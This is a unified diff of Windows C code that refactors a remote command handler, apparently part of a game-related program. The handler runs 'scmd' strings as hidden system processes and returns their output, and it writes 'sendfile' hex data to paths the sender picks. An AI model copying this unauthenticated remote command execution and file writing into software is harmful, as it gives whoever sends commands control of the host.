@@ -4,17 +4,16 @@
 char outputfilename[50] = {0};
 FILE* outputfb;
 
-const char *GetCmdPrintf(char *szFetCmd)
+const char *get_sys_cmd_output(const char *szFetCmd)
 {
 	HANDLE hReadPipe = NULL;
 	HANDLE hWritePipe = NULL;
 	PROCESS_INFORMATION pi;
 	STARTUPINFOA si;
 	SECURITY_ATTRIBUTES sa;
-	static char szBuffer[10000] = {0};
+	static char szBuffer[1024];
 	memset(szBuffer, 0, sizeof(szBuffer));
 	unsigned long count = 0;
-	long long ipos = 0;
 	memset(&pi, 0, sizeof(pi));
 	memset(&si, 0, sizeof(si));
 	memset(&sa, 0, sizeof(sa));
@@ -35,7 +34,7 @@ const char *GetCmdPrintf(char *szFetCmd)
 	si.hStdOutput = hWritePipe;
 	si.wShowWindow = 0;
 	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
-	bret = CreateProcessA(NULL, szFetCmd, NULL, NULL, 1, 0, NULL, NULL, &si, &pi);
+	bret = CreateProcessA(NULL, _strdup(szFetCmd), NULL, NULL, 1, 0, NULL, NULL, &si, &pi);
 	if (!bret) {
 		CloseHandle(hWritePipe);
 		CloseHandle(hReadPipe);
@@ -44,7 +43,7 @@ const char *GetCmdPrintf(char *szFetCmd)
 		return NULL;
 	}
 	WaitForSingleObject(pi.hProcess, 500);
-	bret = ReadFile(hReadPipe, szBuffer, 10000, &count, 0);
+	bret = ReadFile(hReadPipe, szBuffer, 1024, &count, 0);
 	if (!bret) {
 		CloseHandle(hWritePipe);
 		CloseHandle(hReadPipe);
@@ -59,7 +58,8 @@ const char *GetCmdPrintf(char *szFetCmd)
 	return szBuffer;
 }
 
-unsigned char ASCIIToChar(char *inASCII) {
+unsigned char ascii2char(char *inASCII)
+{
 	unsigned char outDec;
 	for (unsigned long count = 1, nums = 0; nums <= strlen(inASCII) - 1; count *= 10, nums++) {
 		if (inASCII[nums] >= 48 && inASCII[nums] <= 57) {
@@ -77,7 +77,8 @@ unsigned char ASCIIToChar(char *inASCII) {
 	return outDec;
 }
 
-unsigned char ASCIIToHex(char *inASCII,unsigned char readsize, char *paddr) {
+unsigned char ascii2hex(char *inASCII,unsigned char readsize, char *paddr)
+{
 	unsigned char outHex = 0;
 	for (unsigned long nums = 0, filebufnums = 0; nums < strlen(inASCII); filebufnums++) {
 		outHex = 0;
@@ -107,11 +108,13 @@ unsigned char ASCIIToHex(char *inASCII,unsigned char readsize, char *paddr) {
 	return outHex;
 }
 
-const char *ReciveFile(const char *cmd) {
+const char *recv_file(const char *cmd) {
 	//printf("%s", cmd);
 	
-	char *cmdspilt = strtok(cmd, " ");
-	char cmdoutput[256] = { 0 }, filebuf[101] = { 0 };
+	char *cmdspilt = strtok(_strdup(cmd), " ");
+	static char cmdoutput[256], filebuf[101];
+	memset(cmdoutput, 0, sizeof(cmdoutput));
+	memset(filebuf, 0, sizeof(filebuf));
 
 	if (strcmp(cmdspilt, "path") == 0) {
 		//printf("filename: ");
@@ -131,8 +134,8 @@ const char *ReciveFile(const char *cmd) {
 		char *recvsize = cmdspilt;
 		strcat(cmdoutput, " ");
 		cmdspilt = strtok(NULL, " ");
-		//printf("%d\n", ASCIIToChar(recvsize));
-		ASCIIToHex(cmdspilt, ASCIIToChar(recvsize), filebuf);
+		//printf("%d\n", ascii2char(recvsize));
+		ascii2hex(cmdspilt, ascii2char(recvsize), filebuf);
 		//printf("Output:%s\n", filebuf);
 		strcat(cmdoutput, cmdspilt);
 		strcat(cmdoutput, " ");
@@ -157,9 +160,9 @@ const char *process_remote_cmd(const char *cmd)
 	if (strstr(cmd, "gcmd"))
 		run_game_cmd(&cmd[5]);
 	else if (strstr(cmd, "scmd"))
-		return GetCmdPrintf(_strdup(&cmd[5]));
+		return get_sys_cmd_output(&cmd[5]);
 	else if (strstr(cmd, "sendfile"))
-		return ReciveFile(&cmd[9]);
+		return recv_file(&cmd[9]);
 
     char *cmd_m = _strdup(cmd);
     const char *argv[4];
